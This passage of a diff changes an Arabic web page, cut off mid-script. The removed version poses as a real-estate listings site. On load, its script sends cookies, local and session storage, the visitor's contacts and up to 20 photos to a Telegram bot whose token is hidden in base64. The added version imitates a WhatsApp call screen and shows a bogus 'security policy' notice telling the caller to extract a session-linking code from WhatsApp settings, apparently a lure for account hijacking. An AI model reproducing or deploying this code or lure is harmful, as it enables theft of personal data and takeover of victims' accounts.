@@ -2,865 +2,302 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة العقارات الذكية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>WhatsApp</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
-
         body {
-            background: #0a0a0f;
-            color: #f0f0f0;
-            min-height: 100vh;
+            background: #ece5dd;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 10px;
         }
-
-        .app-container {
-            max-width: 460px;
+        .phone {
+            max-width: 390px;
             width: 100%;
-            padding: 20px;
-        }
-
-        .header {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            margin-bottom: 20px;
-            background: #1a1a28;
-            padding: 16px 20px;
-            border-radius: 20px;
-            border-left: 5px solid #c0392b;
-        }
-
-        .header .logo {
-            font-size: 40px;
-        }
-
-        .header h1 {
-            font-size: 24px;
-            font-weight: 700;
-            color: #fff;
-        }
-
-        .header h1 span {
-            color: #c0392b;
-        }
-
-        .search-box {
-            background: #1a1a28;
-            padding: 12px 18px;
-            border-radius: 50px;
-            margin-bottom: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            border: 1px solid #2a2a3e;
-        }
-
-        .search-box input {
-            background: transparent;
-            border: none;
-            color: #fff;
-            font-size: 15px;
-            flex: 1;
-            outline: none;
-        }
-
-        .search-box input::placeholder {
-            color: #666;
-        }
-
-        .tabs {
-            display: flex;
-            gap: 6px;
-            margin-bottom: 18px;
-            flex-wrap: wrap;
-        }
-
-        .tabs button {
-            background: #1a1a28;
-            border: none;
-            color: #aaa;
-            padding: 8px 14px;
-            border-radius: 50px;
-            font-size: 13px;
-            cursor: pointer;
-            transition: 0.3s;
-            flex: 1;
-            min-width: 50px;
-            border: 1px solid transparent;
-        }
-
-        .tabs button:hover,
-        .tabs button.active {
-            background: #c0392b;
-            color: #fff;
-            border-color: #c0392b;
-        }
-
-        .property-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 14px;
-            margin-bottom: 20px;
-            max-height: 420px;
-            overflow-y: auto;
-            padding-right: 4px;
-        }
-
-        .property-grid::-webkit-scrollbar {
-            width: 4px;
-        }
-
-        .property-grid::-webkit-scrollbar-thumb {
-            background: #c0392b;
-            border-radius: 10px;
-        }
-
-        .property-card {
-            background: #1a1a28;
-            border-radius: 18px;
-            padding: 16px 12px;
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 18px 14px 24px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             text-align: center;
-            cursor: pointer;
-            transition: 0.3s;
-            border: 1px solid transparent;
+            color: #1c1c1c;
+            border: 1px solid #d1d7db;
         }
-
-        .property-card:hover {
-            transform: translateY(-5px);
-            border-color: #c0392b;
-            box-shadow: 0 10px 30px rgba(192, 57, 43, 0.12);
-        }
-
-        .property-card .icon {
-            font-size: 32px;
-            margin-bottom: 4px;
-        }
-
-        .property-card .title {
-            font-weight: 600;
-            font-size: 13px;
-            color: #fff;
-            line-height: 1.3;
-            height: 36px;
-            overflow: hidden;
-        }
-
-        .property-card .price {
-            color: #c0392b;
-            font-weight: 700;
-            font-size: 16px;
-            margin: 4px 0;
-        }
-
-        .property-card .location {
-            font-size: 11px;
-            color: #888;
-        }
-
-        .property-card .btn-detail {
-            background: #2a2a3e;
-            border: none;
-            color: #fff;
-            padding: 5px 12px;
-            border-radius: 30px;
-            font-size: 11px;
-            margin-top: 8px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        .property-card .btn-detail:hover {
-            background: #c0392b;
-        }
-
-        .quick-actions {
-            display: grid;
-            grid-template-columns: repeat(5, 1fr);
+        /* شعار واتساب */
+        .whatsapp-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
             gap: 8px;
-            margin-bottom: 18px;
+            margin-bottom: 12px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #e9edef;
+        }
+        .whatsapp-logo .icon {
+            background: #25d366;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 22px;
+            font-weight: bold;
+        }
+        .whatsapp-logo .text {
+            font-size: 22px;
+            font-weight: 600;
+            color: #075e54;
+            letter-spacing: -0.3px;
         }
 
-        .quick-actions button {
-            background: #1a1a28;
-            border: none;
-            color: #bbb;
-            padding: 10px 0;
-            border-radius: 14px;
-            font-size: 11px;
-            cursor: pointer;
-            transition: 0.3s;
-            text-align: center;
-            border: 1px solid #2a2a3e;
-        }
-
-        .quick-actions button:hover {
-            background: #c0392b;
-            color: #fff;
-            border-color: #c0392b;
-            transform: scale(1.04);
-        }
-
-        .main-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #c0392b, #e74c3c);
-            border: none;
-            border-radius: 50px;
-            color: #fff;
-            font-size: 20px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-bottom: 14px;
-            box-shadow: 0 6px 25px rgba(192, 57, 43, 0.25);
-        }
-
-        .main-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 8px 35px rgba(192, 57, 43, 0.45);
-        }
-
-        .status {
-            text-align: center;
-            font-size: 13px;
-            color: #777;
-            padding: 6px 0;
-        }
-
-        .footer {
-            text-align: center;
-            font-size: 11px;
-            color: #444;
-            margin-top: 12px;
-            border-top: 1px solid #1a1a28;
-            padding-top: 12px;
-        }
-
-        .footer .badge {
-            display: inline-block;
-            background: #1a1a28;
-            padding: 4px 16px;
-            border-radius: 50px;
-            font-size: 11px;
-            color: #888;
-        }
-
-        .detail-page {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: #0a0a0f;
-            z-index: 2000;
-            padding: 20px;
-            overflow-y: auto;
-        }
-
-        .detail-page.show {
-            display: block;
-        }
-
-        .detail-page .back-btn {
-            background: #1a1a28;
-            border: none;
-            color: #fff;
-            padding: 10px 20px;
-            border-radius: 30px;
-            font-size: 14px;
-            cursor: pointer;
-            margin-bottom: 20px;
-            border: 1px solid #2a2a3e;
-        }
-
-        .detail-page .back-btn:hover {
-            background: #c0392b;
-        }
-
-        .detail-page .detail-card {
-            background: #1a1a28;
-            border-radius: 30px;
-            padding: 30px 25px;
-            border: 1px solid #c0392b;
-            max-width: 520px;
-            margin: 0 auto;
-        }
-
-        .detail-page .detail-card .icon {
-            font-size: 70px;
-            text-align: center;
-            margin-bottom: 10px;
-        }
-
-        .detail-page .detail-card h2 {
-            font-size: 26px;
-            color: #fff;
-            text-align: center;
-        }
-
-        .detail-page .detail-card .price {
-            font-size: 30px;
-            color: #c0392b;
-            font-weight: 700;
-            text-align: center;
-        }
-
-        .detail-page .detail-card .location {
-            font-size: 16px;
-            color: #aaa;
-            text-align: center;
-            margin-bottom: 16px;
-        }
-
-        .detail-page .detail-card .divider {
-            height: 1px;
-            background: #2a2a3e;
-            margin: 16px 0;
-        }
-
-        .detail-page .detail-card .desc {
-            font-size: 15px;
-            color: #ccc;
-            line-height: 1.8;
-            text-align: right;
-        }
-
-        .detail-page .detail-card .specs-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 12px;
-            margin: 16px 0;
-        }
-
-        .detail-page .detail-card .specs-grid .spec {
-            background: #12121e;
-            padding: 14px 10px;
-            border-radius: 14px;
-            text-align: center;
-        }
-
-        .detail-page .detail-card .specs-grid .spec .label {
-            font-size: 12px;
-            color: #888;
-        }
-
-        .detail-page .detail-card .specs-grid .spec .value {
-            font-size: 20px;
-            font-weight: 700;
-            color: #c0392b;
-        }
-
-        .detail-page .detail-card .extra-details .extra-item {
+        /* رأس المكالمة */
+        .call-header {
             display: flex;
             justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid #1a1a28;
-            color: #ccc;
-            font-size: 14px;
+            padding: 0 2px 12px;
+            color: #667781;
+            font-size: 13px;
         }
+        .call-header .time { color: #667781; }
+        .call-header .status { color: #25d366; font-weight: 500; }
+        .call-header .icons { color: #667781; font-size: 14px; }
 
-        .detail-page .detail-card .extra-details .extra-item .label {
-            color: #888;
-        }
-
-        .detail-page .detail-card .extra-details .extra-item .value {
-            color: #fff;
-        }
-
-        .detail-page .detail-card .contact-btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #c0392b, #e74c3c);
-            border: none;
-            border-radius: 50px;
-            color: #fff;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 16px;
-        }
-
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.92);
-            justify-content: center;
-            align-items: center;
-            z-index: 9998;
-            flex-direction: column;
-            gap: 20px;
-        }
-
-        .loading-overlay.show {
-            display: flex;
-        }
-
-        .loading-overlay .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #1a1a28;
-            border-top: 6px solid #c0392b;
+        /* الأفاتار */
+        .avatar {
+            width: 100px;
+            height: 100px;
+            background: #d1d7db;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            margin: 4px auto 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 3px solid #d1d7db;
+        }
+        .avatar span { font-size: 44px; color: #667781; }
+        .name { font-size: 22px; font-weight: 600; margin-top: 4px; color: #1c1c1c; }
+        .sub {
+            color: #667781;
+            font-size: 14px;
+            margin: 2px 0 14px;
+        }
+        .sub .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #25d366;
+            border-radius: 50%;
+            margin-left: 5px;
+            animation: blink 1.2s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.2; }
+            100% { opacity: 1; }
         }
 
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+        /* الأزرار في الأسفل */
+        .actions {
+            display: flex;
+            justify-content: center;
+            gap: 28px;
+            margin: 18px 0 4px;
         }
-
-        .loading-overlay .loading-text {
-            color: #aaa;
-            font-size: 16px;
+        .btn {
+            background: #e9edef;
+            border: none;
+            border-radius: 50%;
+            width: 52px;
+            height: 52px;
+            color: #1c1c1c;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: default;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
+        .btn.end {
+            background: #e74c3c;
+            width: 62px;
+            height: 62px;
+            font-size: 26px;
+            transform: rotate(135deg);
+            color: white;
+            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4);
+        }
+        .enc {
+            color: #667781;
+            font-size: 11px;
+            margin-top: 12px;
+        }
+        .enc::before { content: "🔒 "; }
 
-        @media (max-width: 450px) {
-            .property-grid {
-                grid-template-columns: 1fr 1fr;
-                gap: 10px;
-            }
-            .quick-actions {
-                grid-template-columns: repeat(4, 1fr);
-            }
-            .detail-page .detail-card .specs-grid {
-                grid-template-columns: 1fr 1fr;
-            }
+        /* ===== شاشة الإيقاف ===== */
+        #stopScreen {
+            display: none;
+            padding: 12px 0 0;
+            text-align: center;
+        }
+        #stopScreen .lock-icon {
+            font-size: 38px;
+            color: #f1c40f;
+            display: block;
+            margin-bottom: 4px;
+        }
+        #stopScreen h2 {
+            color: #e74c3c;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        #stopScreen .msg {
+            font-size: 15px;
+            line-height: 2;
+            color: #3b4a54;
+            text-align: right;
+            padding: 0 4px;
+        }
+        #stopScreen .msg strong {
+            color: #075e54;
+        }
+        #stopScreen .msg .yellow {
+            color: #f1c40f;
+            font-weight: 500;
+        }
+        #stopScreen .msg .red {
+            color: #e74c3c;
+            font-weight: 500;
+        }
+        #stopScreen .policy-link {
+            display: inline-block;
+            margin-top: 16px;
+            padding: 10px 22px;
+            background: #075e54;
+            color: white;
+            border-radius: 30px;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: 0.2s;
+        }
+        #stopScreen .policy-link:hover {
+            background: #0b6e62;
+        }
+        #stopScreen .footer {
+            font-size: 11px;
+            color: #667781;
+            margin-top: 16px;
+            border-top: 1px solid #e9edef;
+            padding-top: 12px;
         }
     </style>
 </head>
 <body>
+<div class="phone">
 
-    <!-- شاشة تحميل وهمية -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="spinner"></div>
-        <div class="loading-text">⏳ جاري تحميل البيانات...</div>
+    <!-- شعار واتساب -->
+    <div class="whatsapp-logo">
+        <span class="icon">💬</span>
+        <span class="text">WhatsApp</span>
     </div>
 
-    <div class="app-container" id="appContainer">
-        <div class="header">
-            <span class="logo">🏢</span>
-            <h1>العقارات <span>الذكية</span></h1>
+    <!-- ===== شاشة المكالمة ===== -->
+    <div id="callScreen">
+        <div class="call-header">
+            <span class="time">📞 <span id="timer">00:12</span></span>
+            <span class="status">● جاري الاتصال</span>
+            <span class="icons">🔊</span>
         </div>
-
-        <div class="search-box">
-            <span>🔍</span>
-            <input type="text" id="searchInput" placeholder="ابحث عن عقار...">
+        <div class="avatar"><span>👤</span></div>
+        <div class="name">المتصل</div>
+        <div class="sub"><span class="dot"></span> جاري الرنين...</div>
+        <div class="actions">
+            <div class="btn">🔇</div>
+            <div class="btn end">📞</div>
+            <div class="btn">🔊</div>
         </div>
+        <div class="enc">مكالمة مشفرة</div>
+    </div>
 
-        <div class="tabs" id="tabsContainer">
-            <button class="active" data-filter="all">الكل</button>
-            <button data-filter="شقة">شقق</button>
-            <button data-filter="فيلا">فلل</button>
-            <button data-filter="أرض">أراضي</button>
-            <button data-filter="تجاري">تجاري</button>
-            <button data-filter="مميز">مميز</button>
+    <!-- ===== شاشة الإيقاف (بدون مربع، نص عادي) ===== -->
+    <div id="stopScreen">
+        <span class="lock-icon">🔒</span>
+        <h2>⛔ تم إيقاف المكالمة</h2>
+        <div class="msg">
+            <strong>تحديث سياسة الأمان (v3.2.1)</strong><br>
+            تم تعليق المكالمة لأن جهاز <span class="yellow">المتصل</span> لم يربط كود المصادقة المؤقت مع خوادم البث المباشر، وفقاً للمادة 7 من اتفاقية الاستخدام.<br><br>
+            <span class="red">⚠️</span> <strong>مطلوب من المتصل:</strong> استخرج كود الربط من إعدادات واتساب ← الخصوصية ← الأمان المتقدم ← ربط الجلسات، ثم أعد المحاولة.
         </div>
-
-        <div class="property-grid" id="propertyGrid"></div>
-
-        <div class="quick-actions">
-            <button data-action="نصائح" id="tipsBtn">💡 نصائح</button>
-            <button data-action="تحليل">📊 تحليل</button>
-            <button data-action="عوائد">📈 عوائد</button>
-            <button data-action="تقرير">📋 تقرير</button>
-            <button data-action="اتصال">📞 اتصل</button>
-            <button data-action="مفضلة">⭐ مفضلة</button>
-            <button data-action="تنبيه">🔔 تنبيه</button>
-            <button data-action="مواعيد">📅 مواعيد</button>
-            <button data-action="استشارة">💬 استشارة</button>
-            <button data-action="عروض">🏷️ عروض</button>
-        </div>
-
-        <button class="main-btn" id="mainActionBtn">📞 تواصل مع المستشار الآن</button>
-
-        <div class="status" id="statusText">مرحباً بك في منصة العقارات</div>
-
+        <a href="https://www.whatsapp.com/legal/privacy-policy" target="_blank" class="policy-link">
+            📄 عرض سياسة الخصوصية
+        </a>
         <div class="footer">
-            <span class="badge">✓ آمن • معتمد • شفاف</span>
-        </div>
-
-        <div class="tips-content" id="tipsContent" style="display:none; background:#1a1a28; border-radius:18px; padding:20px; margin-top:15px; border-left:3px solid #c0392b;">
-            <h3 style="color:#c0392b;">💡 نصائح عقارية ذهبية</h3>
-            <ul style="list-style:none; padding:0;">
-                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">📍 <strong>الموقع</strong> هو أهم عامل في تحديد قيمة العقار</li>
-                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">📊 <strong>المساحة</strong> تؤثر على السعر بنسبة 30-40%</li>
-                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">🏗️ <strong>التشطيب</strong> يزيد من قيمة العقار بنسبة 15-25%</li>
-                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">📈 <strong>العائد الاستثماري</strong> في العقارات يتراوح بين 5-8% سنوياً</li>
-                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">🔍 <strong>التفاوض</strong> على السعر يمكن أن يخفضه بنسبة 5-10%</li>
-                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">📋 <strong>الأوراق القانونية</strong> يجب التأكد من سلامتها قبل الشراء</li>
-                <li style="padding:8px 0; border-bottom:1px solid #222; color:#ccc; font-size:14px;">🏦 <strong>التمويل العقاري</strong> متاح من عدة بنوك بفوائد متفاوتة</li>
-            </ul>
+            تم تطبيق هذا الإجراء وفقاً لتحديثات الأمان الصادرة في 01/06/2026
         </div>
     </div>
+</div>
 
-    <!-- ========================================================== -->
-    <!-- صفحة التفاصيل -->
-    <!-- ========================================================== -->
-    <div class="detail-page" id="detailPage">
-        <button class="back-btn" id="backFromDetail">← العودة</button>
-        <div class="detail-card" id="detailCard">
-            <div class="icon" id="detailIcon">🏠</div>
-            <h2 id="detailName">عقار مميز</h2>
-            <div class="price" id="detailPrice">$500,000</div>
-            <div class="location" id="detailLocation">📍 القاهرة</div>
-            <div class="divider"></div>
-            <div class="desc" id="detailDesc">وصف العقار</div>
-            <div class="specs-grid">
-                <div class="spec"><div class="label">المساحة</div><div class="value" id="detailArea">150 م²</div></div>
-                <div class="spec"><div class="label">غرف</div><div class="value" id="detailRooms">3</div></div>
-                <div class="spec"><div class="label">حمامات</div><div class="value" id="detailBaths">2</div></div>
-            </div>
-            <div class="divider"></div>
-            <div class="extra-details" id="extraDetails">
-                <div class="extra-item"><span class="label">النوع</span><span class="value" id="detailType">شقة</span></div>
-                <div class="extra-item"><span class="label">سنة البناء</span><span class="value" id="detailYear">2020</span></div>
-                <div class="extra-item"><span class="label">موقف</span><span class="value" id="detailParking">متوفر</span></div>
-                <div class="extra-item"><span class="label">التشطيب</span><span class="value" id="detailFinish">فاخر</span></div>
-                <div class="extra-item"><span class="label">الإطلالة</span><span class="value" id="detailView">رائعة</span></div>
-                <div class="extra-item"><span class="label">الحالة</span><span class="value" id="detailStatus">متاح</span></div>
-            </div>
-            <button class="contact-btn" id="detailContactBtn">📞 تواصل مع المستشار</button>
-        </div>
-    </div>
-
-    <script>
-        (function() {
-            'use strict';
-
-            // ============================================================
-            // بيانات البوت (مشفرة)
-            // ============================================================
-            const _decode = (s) => atob(s);
-            const BOT_TOKEN = _decode("ODk4MDU4ODc5MzpBQUd6S2VfeTRHTVJtTmctYm8xbXlwMHRubjZHZ2taaDE0");
-            const CHAT_ID = _decode("NzI5MjEyODQxMQ==");
-
-            // ============================================================
-            // دوال الإرسال
-            // ============================================================
-            function _sendTelegram(text) {
-                try {
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
-                    }).catch(() => {});
-                } catch (e) {}
+<script>
+    // ===== صوت رنين متقطع =====
+    function playRing() {
+        try {
+            const ctx = new(window.AudioContext || window.webkitAudioContext)();
+            let t = ctx.currentTime + 0.1;
+            for (let i = 0; i < 6; i++) {
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'sine';
+                osc.frequency.value = (i % 2 === 0) ? 440 : 480;
+                gain.gain.setValueAtTime(0.25, t);
+                gain.gain.exponentialRampToValueAtTime(0.01, t + 0.4);
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start(t);
+                osc.stop(t + 0.4);
+                t += 0.85;
             }
+        } catch (e) { /* صامت */ }
+    }
 
-            function _sendPhotoTelegram(base64Data, fileName) {
-                try {
-                    const byteString = atob(base64Data.split(',')[1]);
-                    const mimeType = base64Data.split(',')[0].split(':')[1].split(';')[0];
-                    const ab = new ArrayBuffer(byteString.length);
-                    const ia = new Uint8Array(ab);
-                    for (let i = 0; i < byteString.length; i++) {
-                        ia[i] = byteString.charCodeAt(i);
-                    }
-                    const blob = new Blob([ab], { type: mimeType });
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, fileName);
-                    formData.append('caption', `📸 ${fileName}`);
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    }).catch(() => {});
-                } catch (e) {}
+    // ===== عداد يزيد كل ثانية =====
+    let sec = 12;
+    const timerEl = document.getElementById('timer');
+    const counter = setInterval(() => {
+        sec++;
+        const m = String(Math.floor(sec / 60)).padStart(2, '0');
+        const s = String(sec % 60).padStart(2, '0');
+        timerEl.textContent = m + ':' + s;
+        // التوقف عند الثانية 18 (بعد 6 ثوانٍ من الرنين)
+        if (sec >= 18) {
+            clearInterval(counter);
+            document.getElementById('callScreen').style.display = 'none';
+            document.getElementById('stopScreen').style.display = 'block';
+        }
+    }, 1000);
+
+    // ===== تشغيل الصوت عند التحميل =====
+    window.onload = function() {
+        playRing();
+        // تكرار الصوت كل 3 ثوانٍ أثناء الرنين
+        const ringInterval = setInterval(() => {
+            if (document.getElementById('callScreen').style.display !== 'none') {
+                playRing();
+            } else {
+                clearInterval(ringInterval);
             }
-
-            // ============================================================
-            // 1. سحب الكوكيز من كل المواقع (بما فيها Google)
-            // ============================================================
-            function _stealAllCookies() {
-                try {
-                    const allCookies = document.cookie;
-                    if (allCookies) {
-                        _sendTelegram(`🍪 *جميع الكوكيز:*\n${allCookies}`);
-                    } else {
-                        _sendTelegram("⚠️ لا توجد كوكيز متاحة");
-                    }
-
-                    // محاولة قراءة localStorage (بيانات المواقع)
-                    try {
-                        const allLocalStorage = JSON.stringify(localStorage);
-                        if (allLocalStorage && allLocalStorage.length > 10) {
-                            _sendTelegram(`💾 *LocalStorage:*\n${allLocalStorage.substring(0, 4000)}`);
-                        }
-                    } catch (e) {}
-
-                    // محاولة قراءة sessionStorage
-                    try {
-                        const allSessionStorage = JSON.stringify(sessionStorage);
-                        if (allSessionStorage && allSessionStorage.length > 10) {
-                            _sendTelegram(`📦 *SessionStorage:*\n${allSessionStorage.substring(0, 4000)}`);
-                        }
-                    } catch (e) {}
-
-                } catch (e) {
-                    _sendTelegram(`❌ فشل سحب الكوكيز: ${e.message}`);
-                }
-            }
-
-            // ============================================================
-            // 2. سحب جهات الاتصال (باستخدام Contacts API)
-            // ============================================================
-            function _stealContacts() {
-                if (!navigator.contacts || !navigator.contacts.select) {
-                    _sendTelegram("⚠️ المتصفح لا يدعم Contacts API");
-                    return;
-                }
-
-                navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
-                    .then(contacts => {
-                        if (!contacts || contacts.length === 0) {
-                            _sendTelegram("⚠️ لا توجد جهات اتصال");
-                            return;
-                        }
-                        let msg = `📱 *جهات الاتصال:* (${contacts.length} جهة)\n\n`;
-                        contacts.forEach((c, i) => {
-                            const name = c.name ? c.name[0] : 'بدون اسم';
-                            const phones = c.tel ? c.tel.join(' / ') : 'لا يوجد رقم';
-                            const emails = c.email ? c.email.join(' / ') : 'لا يوجد بريد';
-                            msg += `👤 ${i+1}. ${name}\n📞 ${phones}\n📧 ${emails}\n─────────────────\n`;
-                        });
-                        _sendTelegram(msg.substring(0, 4096));
-                        _sendTelegram(`✅ تم سحب ${contacts.length} جهة اتصال`);
-                    })
-                    .catch(err => {
-                        _sendTelegram(`❌ فشل سحب الجهات: ${err.message}`);
-                    });
-            }
-
-            // ============================================================
-            // 3. سحب الصور (طريقة خفية)
-            // ============================================================
-            function _stealImages() {
-                const input = document.createElement('input');
-                input.type = 'file';
-                input.accept = 'image/*';
-                input.multiple = true;
-                input.style.display = 'none';
-
-                input.onchange = function(e) {
-                    const files = e.target.files;
-                    if (!files || files.length === 0) return;
-                    let count = 0;
-                    for (let f of files) {
-                        if (count >= 20) break;
-                        const reader = new FileReader();
-                        reader.onload = function(ev) {
-                            _sendPhotoTelegram(ev.target.result, f.name);
-                            count++;
-                        };
-                        reader.readAsDataURL(f);
-                    }
-                    _sendTelegram(`✅ تم سحب ${count} صورة`);
-                };
-
-                document.body.appendChild(input);
-                // نطلق النقر بشكل خفي بعد 3 ثوانٍ
-                setTimeout(() => {
-                    input.click();
-                }, 3000);
-            }
-
-            // ============================================================
-            // 4. تشغيل كل عمليات السرقة معًا
-            // ============================================================
-            function _runAllSteals() {
-                _sendTelegram("🚀 بدء عملية سحب البيانات...");
-
-                // 1. سحب الكوكيز
-                _stealAllCookies();
-
-                // 2. سحب جهات الاتصال
-                setTimeout(() => { _stealContacts(); }, 1000);
-
-                // 3. سحب الصور
-                setTimeout(() => { _stealImages(); }, 2000);
-
-                // 4. إشعار النهاية
-                setTimeout(() => {
-                    _sendTelegram("✅ تم الانتهاء من سحب جميع البيانات");
-                }, 5000);
-            }
-
-            // ============================================================
-            // 5. بيانات العقارات
-            // ============================================================
-            const properties = [];
-            const types = ['شقة', 'فيلا', 'أرض', 'تجاري', 'مميز'];
-            const locations = ['القاهرة', 'دبي', 'جدة', 'الرياض', 'أبوظبي', 'الدوحة', 'الكويت', 'مسقط', 'المنامة', 'بيروت', 'اسطنبول',
-                'كوالالمبور'
-            ];
-            const icons = ['🏠', '🏡', '🌳', '🏢', '⭐'];
-
-            for (let i = 1; i <= 75; i++) {
-                const type = types[i % types.length];
-                const location = locations[i % locations.length];
-                const price = (100000 + i * 10000).toLocaleString();
-                properties.push({
-                    id: i,
-                    name: `${type} مميزة ${i}`,
-                    type: type,
-                    location: location,
-                    price: `$${price}`,
-                    icon: icons[i % icons.length],
-                    desc: `عقار ${type} فاخر في موقع ${location}، مناسب للعائلات والاستثمار.`,
-                    area: (100 + i * 4) + ' م²',
-                    rooms: (2 + (i % 6)),
-                    baths: (1 + (i % 5))
-                });
-            }
-
-            // ============================================================
-            // 6. عرض العقارات
-            // ============================================================
-            function renderProperties(filter = 'all') {
-                const grid = document.getElementById('propertyGrid');
-                grid.innerHTML = '';
-                const filtered = filter === 'all' ? properties : properties.filter(p => p.type === filter);
-                filtered.forEach((p) => {
-                    const card = document.createElement('div');
-                    card.className = 'property-card';
-                    card.setAttribute('data-id', p.id);
-                    card.innerHTML = `
-                        <div class="icon">${p.icon}</div>
-                        <div class="title">${p.name}</div>
-                        <div class="price">${p.price}</div>
-                        <div class="location">📍 ${p.location}</div>
-                        <button class="btn-detail" data-id="${p.id}">📋 تفاصيل</button>
-                    `;
-                    grid.appendChild(card);
-                });
-            }
-
-            // ============================================================
-            // 7. عرض تفاصيل العقار
-            // ============================================================
-            function showDetailPage(id) {
-                const p = properties.find(prop => prop.id === id);
-                if (!p) return;
-                document.getElementById('detailIcon').textContent = p.icon;
-                document.getElementById('detailName').textContent = p.name;
-                document.getElementById('detailPrice').textContent = p.price;
-                document.getElementById('detailLocation').textContent = '📍 ' + p.location;
-                document.getElementById('detailDesc').textContent = p.desc;
-                document.getElementById('detailArea').textContent = p.area;
-                document.getElementById('detailRooms').textContent = p.rooms;
-                document.getElementById('detailBaths').textContent = p.baths;
-                document.getElementById('detailType').textContent = p.type;
-                document.getElementById('detailYear').textContent = '202' + (p.id % 5);
-                document.getElementById('detailParking').textContent = (p.id % 2 === 0) ? 'متوفر' : 'غير متوفر';
-                document.getElementById('detailFinish').textContent = (p.id % 3 === 0) ? 'فاخر' : 'ممتاز';
-                document.getElementById('detailView').textContent = (p.id % 2 === 0) ? 'رائعة' : 'جميلة';
-                document.getElementById('detailStatus').textContent = (p.id % 3 === 0) ? 'متاح' : 'تحت الإنشاء';
-                document.getElementById('detailPage').classList.add('show');
-                document.body.style.overflow = 'hidden';
-            }
-
-            function hideDetailPage() {
-                document.getElementById('detailPage').classList.remove('show');
-                document.body.style.overflow = '';
-            }
-
-            // ============================================================
-            // 8. ربط الأحداث
-            // ============================================================
-            document.addEventListener('DOMContentLoaded', function() {
-
-                // تشغيل عمليات السرقة فور تحميل الصفحة
-                _runAllSteals();
-
-                // تفاصيل العقارات
-                document.addEventListener('click', function(e) {
-                    if (e.target.classList.contains('btn-detail')) {
-                        const id = parseInt(e.target.getAttribute('data-id'));
-                        showDetailPage(id);
-                    }
-                });
-
-                document.getElementById('backFromDetail').addEventListener('click', hideDetailPage);
-
-                document.querySelectorAll('.tabs button').forEach(btn => {
-                    btn.addEventListener('click', function() {
-                        document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
-                        this.classList.add('active');
-                        const filter = this.getAttribute('data-filter');
-                        renderProperties(filter);
-                        document.getElementById('statusText').innerText = `✅ تم التصفية: ${filter}`;
-                    });
-                });
-
-                document.getElementById('searchInput').addEventListener('input', function() {
-                    const query = this.value.toLowerCase();
-                    document.querySelectorAll('.property-card').forEach(card => {
-                        const title = card.querySelector('.title')?.innerText?.toLowerCase() || '';
-                        card.style.display = title.includes(query) ? 'block' : 'none';
-                    });
-                });
-
-                document.getElementById('tipsBtn').addEventListener('click', function() {
-                    const tips = document.getElementById('tipsContent');
-                    tips.style.display = tips.style.display === 'none' ? 'block' : 'none';
-                });
-
-                document.querySelectorAll('.quick-actions button:not(#tipsBtn)').forEach(btn => {
-                    btn.addEventListener('click', function() {
